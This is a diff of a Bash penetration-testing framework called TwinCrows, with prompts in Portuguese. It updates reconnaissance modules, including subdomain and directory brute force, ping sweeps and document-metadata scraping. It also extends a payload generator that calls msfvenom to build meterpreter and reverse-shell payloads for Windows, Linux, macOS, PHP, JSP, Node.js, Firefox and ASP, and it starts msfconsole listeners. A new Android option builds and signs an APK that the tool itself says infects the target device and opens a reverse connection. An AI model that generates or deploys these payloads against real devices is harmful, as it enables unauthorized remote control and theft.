@@ -22,6 +22,7 @@ tc_banner() {
 }
 
 sair() {
+	rm -rf $TCTmp
 	echo -e "${cinza}\n\nOBRIGADO POR UTILIZAR O TWINCROWS!\n\n${normal}"
 	exit
 }
@@ -124,12 +125,11 @@ tc_bf_subd() {
 	printf "${verde}Informe o dominio: ${normalbold}"
 	read dominio
 	echo -e "\n"
-	printf "${verde}Deseja informar uma wordlist? [s/n]: ${normalbold}"
+	printf "${verde}Informe uma wordlist ou pressione [Enter] para utilizar a padrao: ${normalbold}"
 	read opcao
-	if [ "$opcao" == "s" ]
+	if [ ! -z "$opcao" ]
 	then
-		printf "${verde}Informe o caminho da wordlist: ${normalbold}"
-		read wlsubdominio
+		wlsubdominio=$opcao
 	fi
 	echo -e "\n"
 	centralizado "${azulbold}Mapeando os subdominios, aguarde...${normal}\n"
@@ -144,10 +144,19 @@ tc_bf_subd() {
 			echo -ne "\r$sub.$dominio ...              "
 		fi
 	done
-	sair
+	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
+        read opcao
+        if [ "$opcao" == "s" ]
+        then
+		clear
+                tc_bf_subd
+        else
+                exec $1
+        fi
 }
 
 tc_dns_rev() {
+	local dns=()
 	centralizado "${azulbold}===== DNS Reverso =====\n\n${normal}"
 	echo -e "${cinza}Este modulo faz uma pesquisa reversa, a partir de um range de IP coletado em modulos anteriores, e possivel fazer uma pesquisa e revelar qual deles tem um dominio associado."
 	echo
@@ -168,8 +177,13 @@ tc_dns_rev() {
 		if [ ! -z "$ht" ]
 		then
 			echo -e "$ht -- $prefixo.$range"
+			dns+=($ht)
 		fi
 	done
+	if [ -z "$dns" ]
+	then
+		echo -e "${vermelho}Nenhum dominio foi encontrado!\n${normal}"
+	fi
 	rm -f ip
 	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
         read opcao
@@ -189,15 +203,14 @@ tc_dirsearch() {
 	printf "${verde}Informe o dominio: ${normalbold}"
         read dominio
         echo
-	printf "${verde}Informe uma extensao ex(php) ou pressione enter para não pesquisar por arquivos: ${normalbold}"
+	printf "${verde}Informe uma extensao ex(php) ou pressione [Enter] para não pesquisar por arquivos: ${normalbold}"
 	read extensao
 	echo
-	printf "${verde}Deseja informar uma wordlist? [s/n]: ${normalbold}"
+	printf "${verde}Informe o caminho de uma wordlist ou pressione [Enter] para utilizar a padrao: ${normalbold}"
         read opcao
-        if [ "$opcao" == "s" ]
+        if [ ! -z "$opcao" ]
         then
-                printf "${verde}Informe o caminho da wordlist: ${normalbold}"
-                read wldiretorio
+		wldiretorio=$opcao
         fi
 	echo
 	printf "${verde}Deseja utilizar o Tor como proxy? [s/n]: ${normalbold}"
@@ -209,7 +222,15 @@ tc_dirsearch() {
 	else
 		webrecon $wldiretorio $dominio $extensao
 	fi
-	sair
+	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
+        read opcao
+        if [ "$opcao" == "s" ]
+        then
+		clear
+                tc_dirsearch
+        else
+                exec $1
+        fi
 
 }
 
@@ -271,18 +292,18 @@ tc_pingsweep() {
 	echo
 	printf "${verde}Informe o IP da rede Ex 37.59.174.226: ${normalbold}"
         read ip
-        echo $ip > ip
+        echo $ip > $TCTmp/ip
         echo
         printf "${verde}Digite o intervalo do netrange Ex: 220 226: ${normalbold}"
         read intervalo
         echo
         centralizado "${azulbold}===== RESULTADO =====${normal}\n"
         echo
-        prefixo=$(awk -F. '{print $1"."$2"."$3}' ip)
-        prefixo2=$(awk -F. '{print $1"-"$2"-"$3}' ip)
+        prefixo=$(awk -F. '{print $1"."$2"."$3}' $TCTmp/ip)
+        prefixo2=$(awk -F. '{print $1"-"$2"-"$3}' $TCTmp/ip)
         for range in $(seq $intervalo);do ping -c 1 $prefixo.$range -w 1| grep "64 bytes" | cut -d " " -f4 | sed s'/.$//'g
 	done
-	rm -f ip
+	rm -f $TCTmp/ip
 	printf "${verdebold}\n\nDeseja efetuar um novo pingsweep? [s/n]: ${normalbold}"
         read opcao
         if [ "$opcao" == "s" ]
@@ -350,7 +371,7 @@ tc_user_mail() {
 	echo -e "${azulbold}\nGerando as listas..."
 	python3 $TCScripts/userMail.py $nomes $dominio
 	sleep 1
-	echo -e "${azulbold}\nWordlists salvas em $TCWordlists/usuarios.txt e TCWordlists/emails.txt${normal}"
+	echo -e "${normalbold}\nWordlists salvas em $TCOutputs/usuarios.txt e $TCOutputs/emails.txt${normal}"
 	echo
 	printf "${verdebold}\n\nDeseja criar uma nova wordlist? [s/n]: ${normalbold}"
         read opcao
@@ -365,17 +386,6 @@ tc_user_mail() {
 
 }
 
-
-
-
-
-
-
-
-
-
-
-
 tc_mt_wl() {
 	centralizado "${azulbold}===== Mutacao de Wordlist =====\n\n${normal}"
 	echo -e "${cinza}Este modulo faz uma mutacao de palavras chave para explorar suas variacoes, quanto maior a lista de palavras chave, maior sera o resultado final."
@@ -383,12 +393,11 @@ tc_mt_wl() {
 	printf "${verde}Informe o caminho da wordlist base: ${normalbold}"
 	read wl
 	echo -e "\n"
-	printf "${verde}Informe o nome para o arquivo de saida da wordlist mutada: ${normalbold}"
-	read nome
+	printf "${azulbold}Iniciando mutacao... ${normalbold}"
 	echo -e "\n\n"
-	python3 $TCScripts/wlmutacao.py $wl $TCWordlists/$nome
+	python3 $TCScripts/wlmutacao.py $wl $TCOutputs/wordlist_mutada.txt
 	echo -e "\n"
-	echo -e "Arquivo salvo em $TCWordlists/$nome"
+	echo -e "Arquivo salvo em $TCOutputs/wordlist_mutada.txt"
 	echo
 	printf "${verdebold}\n\nDeseja efetuar uma nova mutacao de wordlist? [s/n]: ${normalbold}"
         read opcao
@@ -412,21 +421,21 @@ tc_metadados() {
 	printf "${verde}Informe a extensao para pesquisa de arquivo ex pdf, txt ou xlsx: ${normalbold}"
 	read arquivo
 	echo -e '\n'
-	printf "${verde}Informe o caminho para salvar os arquivos baixados: ${normalbold}"
-	read caminho
+	caminho=$TCOutputs
 	echo -e '\n'
-	lynx --dump "https://google.com/search?&q=site:"$dominio"+ext:"$arquivo"" | grep ".$arquivo" | cut -d "=" -f2 | egrep -v "google|site" | sed 's/...$//' > arquivos
-	if [ $(cat arquivos | wc -l) == 0 ]
+	lynx --dump "https://google.com/search?&q=site:"$dominio"+ext:"$arquivo"" | grep ".$arquivo" | cut -d "=" -f2 | egrep -v "google|site" | sed 's/...$//' > $TCTmp/arquivos
+	if [ $(cat $TCTmp/arquivos | wc -l) == 0 ]
 	then
 		echo -e "\nNenhum arquivo encontrado\n"
 	else
-		for url in $(cat arquivos)
+		for url in $(cat $TCTmp/arquivos)
 		do
 			wget -q -P $caminho $url
 		done
 		exiftool $caminho/*.$arquivo
+		echo -e "\n${azul}Arquivos salvos em $TCOutputs/${normal}"
 	fi
-	rm -f arquivos
+	rm -f $TCTmp/arquivos
 	echo
         printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
         read opcao
@@ -655,6 +664,7 @@ tc_payload() {
 	echo -e "2 - Linux"
 	echo -e "3 - Mac"
 	echo -e "4 - Web"
+	echo -e "5 - Android"
         echo
         echo -e "0 - voltar${normal}"
 
@@ -695,16 +705,24 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: programa.exe: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/win_x64_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/win_x64_payload.rc
+						xterm -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/win_x64_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/win_x64_payload.rc
+						fi
 					fi
+
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $TCPayloads/$nome
-					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${azulbold}\nPayload salvo em $TCPayloads/$nome! ${normal}"
 					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                 		        read opcao
                         		if [ "$opcao" == "s" ]
@@ -722,13 +740,21 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: programa.exe: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/win_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/win_payload.rc
+						xterm -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/win_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/win_payload.rc
+						fi
 					fi
+
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $TCPayloads/$nome
 					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
@@ -783,12 +809,19 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.elf: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/linux_x86_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload linux/x86/meterpreter_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/linux_x86_payload.rc
+						xterm -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/linux_x86_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload linux/x86/meterpreter_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/linux_x86_payload.rc
+						fi
 					fi
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $TCPayloads/$nome
@@ -810,12 +843,19 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.elf: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/linux_x64_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/linux_x64_payload.rc
+						xterm -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/linux_x64_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/linux_x64_payload.rc
+						fi
 					fi
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $TCPayloads/$nome
@@ -870,12 +910,19 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: programa.macho: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/mac_x64_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload osx/x64/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/mac_x86_payload.rc
+						xterm -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload osx/x64/shell_reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/mac_x64_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload osx/x64/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/mac_x86_payload.rc
+						fi
 					fi
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p osx/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $TCPayloads/$nome
@@ -897,12 +944,19 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: programa.macho: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/mac_x64_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload osx/x86/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/mac_x64_payload.rc
+						xterm -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload osx/x86/shell_reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/mac_x64_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload osx/x86/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/mac_x64_payload.rc
+						fi
 					fi
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho -o $TCPayloads/$nome
@@ -960,12 +1014,19 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: pagina.php: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/php_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload php/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/php_payload.rc
+						xterm -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload php/meterpreter/reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/php_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload php/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/php_payload.rc
+						fi
 					fi
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $TCPayloads/$nome
@@ -987,12 +1048,19 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.jsp: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/java_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload java/jsp_shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/java_payload.rc
+						xterm -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload java/jsp_shell_reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/java_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload java/jsp_shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/java_payload.rc
+						fi
 					fi
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
@@ -1014,12 +1082,19 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/js_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload nodejs/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/js_payload.rc
+						xterm -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload nodejs/shell_reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/js_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload nodejs/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/js_payload.rc
+						fi
 					fi
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p nodejs/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
@@ -1041,12 +1116,19 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/firefox_js_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload firefox/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/firefox_js_payload.rc
+						xterm  -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload firefox/shell_reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/firefox_js_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload firefox/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/firefox_js_payload.rc
+						fi
 					fi
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p firefox/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
@@ -1068,12 +1150,19 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o nome para o payload com extensao ex: pagina.asp: ${normalbold}"
 					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					if [ "$rc" == "s" ]
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
 					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/asp_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/asp_payload.rc
+						xterm  -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/asp_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/asp_payload.rc
+						fi
 					fi
 					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
 					msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp -o $TCPayloads/$nome
@@ -1100,8 +1189,66 @@ tc_payload() {
 			done
 
 		;;
+		5)
+			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}Android${vermbold}]\n└─────►${normal}"
+			centralizado "${azulbold}===== Andoid Payloads =====\n\n${normal}"
+			echo -e "${cinza}Escolha uma das opcoes."
 
+			while :
+			do
 
+			echo -e "${verde}"
+			echo -e "1 - TwinCrwos.app - android/meterpreter/reverse_tcp"
+			echo
+			echo -e "0 - Voltar"
+
+			echo -e "${normal}"
+			printf $nvl3
+			read -p ' ' opcao3
+
+			echo
+
+			case $opcao3 in
+				"1")
+					echo -e "${cinza}Este payload cria um app (TwinCrows.apk) assinado que infecta o aparelho alvo e abre uma conexao reversa.\n"
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
+					then
+						xterm  -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/android_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/android_payload.rc
+						fi
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport > $TCPayloads/TwinCrows.apk
+					echo -e "${azulbold}\nAssinano o aplicativo...${normal}\n"
+					keytool -genkey -V -keystore $TCPayloads/tc.keystore -storepass twincrows -alias tc -keypass twincrows -dname "CN=TwinCrows,O=Android,C=BR" -keyalg RSA -keysize 2048 -validity 10000 2> /dev/null 
+					jarsigner -verbose -keystore $TCPayloads/tc.keystore -storepass twincrows -keypass twincrows -digestalg SHA1 -sigalg MD5withRSA $TCPayloads/TwinCrows.apk tc 2> /dev/null 
+					rm $TCPayloads/tc.keystore
+					echo -e "${azulbold}\n\nAplicativo assinado com sucesso! Salvo em $TCPayloads/TwinCrows.apk\n${normal}"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+			esac
+			done
+		;;
 		0)
 			exec $TCPath/TwinCrows
 		;;
@@ -1115,13 +1262,6 @@ tc_payload() {
 	done
 
 }
-
-
-
-
-
-
-
 
 nmap_host() {
 	if [ -z "$2" ]
